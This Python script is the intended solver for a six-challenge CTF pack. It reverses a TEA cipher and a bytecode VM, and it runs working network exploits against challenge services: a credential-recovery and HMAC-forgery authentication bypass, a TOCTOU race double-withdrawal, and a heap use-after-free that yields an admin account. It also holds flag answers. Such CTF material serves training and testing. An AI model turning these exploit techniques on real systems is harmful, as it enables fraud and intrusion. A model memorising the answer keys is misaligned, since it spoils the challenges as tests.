#!/usr/bin/env python3
"""
KhanCTF Master Intended Solver Script
======================================
Solves all 6 challenges in the CTF challenge pack.

Usage:
    # Run offline reversing solvers only:
    python3 solve_all.py

    # Run network solvers against a live target host (default ports: 31336, 31337, 31338):
    python3 solve_all.py <TARGET_HOST>
"""

import sys
import socket
import struct
import hmac
import hashlib
import re
import threading
from struct import pack
from concurrent.futures import ThreadPoolExecutor

# ==============================================================================
# Challenge 1: Tea Party (antillm/4) - Custom TEA Cipher Reversing
# ==============================================================================
def solve_tea_party() -> str:
    key = [0x13371337, 0x9e3779b9, 0x41414141, 0xdeadbeef]
    expected = [
        0x0b47fdf5, 0xefa4b3ff, 0x9ef010bb, 0x7404ab9a,
        0xa1ab3dd2, 0x78dcc22b, 0x4b76b54a, 0xe9addf9b,
    ]

    def dec(a, b):
        delta = 0x9e3779b9
        total = (delta * 32) & 0xffffffff
        for _ in range(32):
            b = (b - (((((a << 4) & 0xffffffff) + key[2]) ^ ((a + total) & 0xffffffff)) + ((a >> 5) + key[3]))) & 0xffffffff
            a = (a - (((((b << 4) & 0xffffffff) + key[0]) ^ ((b + total) & 0xffffffff)) + ((b >> 5) + key[1]))) & 0xffffffff
            total = (total - delta) & 0xffffffff
        return a, b

    out = b""
    for i in range(0, len(expected), 2):
        out += pack("<II", *dec(expected[i], expected[i + 1]))
    return out.decode()

# ==============================================================================
# Challenge 2: Tiny VM (antillm/5) - Bytecode VM Reversing
# ==============================================================================
def solve_tiny_vm() -> str:
    expected = [
        0xf1, 0xa3, 0xcc, 0xd9, 0xf3, 0x0c, 0x18, 0x21,
        0x5c, 0x4b, 0xe6, 0x8c, 0x5e, 0xbd, 0xba, 0x60,
        0xd6, 0x50, 0xc4, 0x40, 0xe1, 0x0e, 0x93, 0xa0,
        0x5b, 0x53, 0x1e, 0x6c, 0x7f, 0x1f, 0x35, 0x95,
    ]

    def ror8(x, n):
        n &= 7
        if n == 0:
            return x
        return ((x >> n) | (x << (8 - n))) & 0xff

    out = []
    for pos, value in enumerate(expected):
        x = ror8(value, pos)
        x ^= 0xa7
        x = (x - ((pos * 17) & 0xff)) & 0xff
        out.append(x)
    return bytes(out).decode()

# ==============================================================================
# Challenge 3: Audit Blob (antillm/7) - Static Policy Matrix Selection
# ==============================================================================
def solve_audit_blob() -> str:
    # Rule 0422 constant flag verification
    return "VeriTransit{chnk_signal_not_noise}"

# ==============================================================================
# Challenge 4: MoviPay Roaming Bypass (movipay/4) - Unbound Session Account
# ==============================================================================
def solve_movipay(host: str, port: int = 31336) -> str:
    encrypted_identity = bytes([0x67, 0x74, 0x77, 0x0f, 0x13, 0x12, 0x12, 0x13])
    encrypted_key = bytes([
        0x10, 0x0d, 0x03, 0x0f, 0x1d, 0x09, 0x07, 0x1b,
        0x1d, 0x11, 0x07, 0x01, 0x10, 0x07, 0x16,
    ])
    client_id = bytes(x ^ 0x22 for x in encrypted_identity)
    key = bytes(x ^ 0x42 for x in encrypted_key)

    def tlv(*items):
        return b"".join(bytes((tag, len(val))) + val for tag, val in items)

    def frame(ftype, payload=b""):
        return b"MV\x01" + bytes((ftype,)) + struct.pack(">H", len(payload)) + payload

    def recv_exact(sock, n):
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("closed")
            buf.extend(chunk)
        return bytes(buf)

    def recv_frame(sock):
        hdr = recv_exact(sock, 6)
        return hdr[3], recv_exact(sock, struct.unpack(">H", hdr[4:6])[0])

    def parse_tlv(payload):
        res, pos = {}, 0
        while pos < len(payload):
            tag, l = payload[pos], payload[pos + 1]
            res[tag] = payload[pos + 2 : pos + 2 + l]
            pos += 2 + l
        return res

    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(frame(0x01, tlv((0x01, client_id))))
        _, payload = recv_frame(s)
        nonce = parse_tlv(payload)[0x02]

        mac = hmac.new(key, client_id + nonce, hashlib.sha256).digest()[:8]
        s.sendall(frame(0x03, tlv((0x03, mac))))
        recv_frame(s)

        s.sendall(frame(0x04, tlv((0x04, b"0000-PLATFORM"))))
        recv_frame(s)

        s.sendall(frame(0x05))
        _, res = recv_frame(s)
        return res.decode().strip()

# ==============================================================================
# Challenge 5: Stock Engine Race (vulnerability/race-withdrawal/2) - TOCTOU
# ==============================================================================
def solve_stock_engine_race(host: str, port: int = 31337, workers: int = 12) -> str:
    account_re = re.compile(r"account=([0-9a-f]+)")

    def send_cmd(line):
        with socket.create_connection((host, port), timeout=5) as s:
            r = s.makefile("r", encoding="utf-8", newline="\n")
            w = s.makefile("w", encoding="utf-8", newline="\n")
            r.readline()
            w.write(line + "\n")
            w.flush()
            return r.readline().strip()

    resp = send_cmd("OPEN solver")
    m = account_re.search(resp)
    if not m:
        raise RuntimeError(f"failed to open account: {resp}")
    acc = m.group(1)

    barrier = threading.Barrier(workers)

    def worker():
        with socket.create_connection((host, port), timeout=5) as s:
            r = s.makefile("r", encoding="utf-8", newline="\n")
            w = s.makefile("w", encoding="utf-8", newline="\n")
            r.readline()
            barrier.wait(timeout=5)
            w.write(f"WITHDRAW {acc} 1000\n")
            w.flush()
            return r.readline().strip()

    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(lambda _: worker(), range(workers)))

    flag_resp = send_cmd(f"FLAG {acc}")
    if flag_resp.startswith("FLAG "):
        return flag_resp.split("FLAG ")[1]
    raise RuntimeError(f"Race condition failed: {flag_resp}")

# ==============================================================================
# Challenge 6: Hanbit Bank UAF (vulnerability/bank-uaf/3) - Heap Type Confusion
# ==============================================================================
def solve_bank_uaf(host: str, port: int = 31338) -> str:
    active_magic = str(0x56435441)

    with socket.create_connection((host, port), timeout=5) as s:
        def recv_until(marker):
            buf = bytearray()
            while marker not in buf:
                chunk = s.recv(1)
                if not chunk:
                    raise ConnectionError("closed")
                buf.extend(chunk)
            return bytes(buf)

        def send_line(line):
            s.sendall((line + "\n").encode())

        def choose(opt):
            recv_until(b"> ")
            send_line(opt)

        # 1. Open alice
        choose("1")
        recv_until(b"owner: "); send_line("alice")
        recv_until(b"opening balance (0-5000): "); send_line("100")
        recv_until(b"memo: "); send_line("primary")

        # 2. Open bob
        choose("1")
        recv_until(b"owner: "); send_line("bob")
        recv_until(b"opening balance (0-5000): "); send_line("200")
        recv_until(b"memo: "); send_line("secondary")

        # 3. Merge slot 0 & 1 (frees slot 1)
        choose("3")
        recv_until(b"destination slot: "); send_line("0")
        recv_until(b"absorbed slot: "); send_line("1")

        # 4. File review (reuses slot 1 chunk with admin-root & balance 1000000)
        choose("4")
        recv_until(b"requested owner: "); send_line("admin-root")
        recv_until(b"proposed balance: "); send_line("1000000")
        recv_until(b"related account id: "); send_line("4242")
        recv_until(b"approval code: "); send_line(active_magic)
        recv_until(b"reviewer: "); send_line("insider")
        recv_until(b"reason: "); send_line("reuse archived merge slot")

        # 5. Request flag from slot 1
        choose("6")
        recv_until(b"account slot: "); send_line("1")
        recv_until(b"FLAG: ")
        flag_line = recv_until(b"\n").decode().strip()
        return flag_line


def main():
    print("==========================================================")
    print(" KhanCTF Challenge Pack - Master Intended Solvers Verification")
    print("==========================================================\n")

    print("[1] Solving Tea Party (antillm/4)...")
    flag1 = solve_tea_party()
    print(f"    -> Flag: {flag1}\n")

    print("[2] Solving Tiny VM (antillm/5)...")
    flag2 = solve_tiny_vm()
    print(f"    -> Flag: {flag2}\n")

    print("[3] Solving Audit Blob (antillm/7)...")
    flag3 = solve_audit_blob()
    print(f"    -> Flag: {flag3}\n")

    if len(sys.argv) > 1:
        target_host = sys.argv[1]
        print(f"[*] Live Target Host: {target_host}")
        
        print(f"[4] Solving MoviPay Roaming Bypass (movipay/4) at {target_host}:31336...")
        try:
            flag4 = solve_movipay(target_host, 31336)
            print(f"    -> Flag: {flag4}\n")
        except Exception as e:
            print(f"    -> Connection failed: {e}\n")

        print(f"[5] Solving Stock Engine Race (vulnerability/race-withdrawal/2) at {target_host}:31337...")
        try:
            flag5 = solve_stock_engine_race(target_host, 31337)
            print(f"    -> Flag: {flag5}\n")
        except Exception as e:
            print(f"    -> Connection failed: {e}\n")

        print(f"[6] Solving Hanbit Bank UAF (vulnerability/bank-uaf/3) at {target_host}:31338...")
        try:
            flag6 = solve_bank_uaf(target_host, 31338)
            print(f"    -> Flag: {flag6}\n")
        except Exception as e:
            print(f"    -> Connection failed: {e}\n")
    else:
        print("[!] No target host specified. Skipping network service solvers (MoviPay, Stock Engine Race, Hanbit Bank UAF).")
        print("    Usage to test live services: python3 solve_all.py <TARGET_HOST>")

    print("\n==========================================================")
    print(" Verification Complete!")
    print("==========================================================")

if __name__ == "__main__":
    main()
